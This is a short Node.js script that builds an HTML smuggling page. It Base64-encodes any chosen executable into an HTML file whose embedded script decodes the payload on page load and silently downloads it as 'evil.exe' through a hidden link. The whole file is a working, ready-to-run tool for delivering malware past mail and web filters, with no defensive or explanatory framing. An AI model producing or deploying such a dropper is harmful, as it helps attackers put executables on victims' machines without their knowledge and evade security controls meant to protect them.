const fs = require('fs');
const path = require('path');

// Function to read the EXE file and convert it to a Base64 string
function exeToBase64(exeFilePath) {
    try {
        const exeFile = fs.readFileSync(exeFilePath);
        const base64Data = exeFile.toString('base64');
        return base64Data;
    } catch (error) {
        console.error("Error reading or encoding the file:", error.message);
        return null;
    }
}

// Function to generate the HTML content with the Base64 data embedded
function generateHtmlWithBase64(base64Data) {
    const htmlTemplate = `
<!-- HTML Smuggling Code -->
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
                var binaryString = window.atob(base64);
                var len = binaryString.length;
                var bytes = new Uint8Array(len);
                for (var i = 0; i < len; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                return bytes.buffer;
            }

            var base64Data = "${base64Data}";
            var data = base64ToArrayBuffer(base64Data);
            var blob = new Blob([data], { type: 'application/octet-stream' });
            var fileName = 'evil.exe';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob, fileName);
            } else {
                var a = document.createElement('a');
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>
`;
    return htmlTemplate;
}

// Main function to run the script
function main() {
    const exeFilePath = path.resolve(__dirname, 'path/to/your/file.exe'); // replace with your exe file path
    const base64Data = exeToBase64(exeFilePath);

    if (base64Data) {
        console.log("The Base64 representation of the exe file is successful.");

        try {
            const outputHtmlContent = generateHtmlWithBase64(base64Data);
            fs.writeFileSync('output.html', outputHtmlContent);
            console.log("HTML file generated successfully.");
        } catch (error) {
            console.error("Error generating HTML file:", error.message);
            process.exit(1);
        }
    } else {
        console.log("Failed to encode the exe file to Base64.");
        process.exit(1);
    }
}

// Run the main function
main();
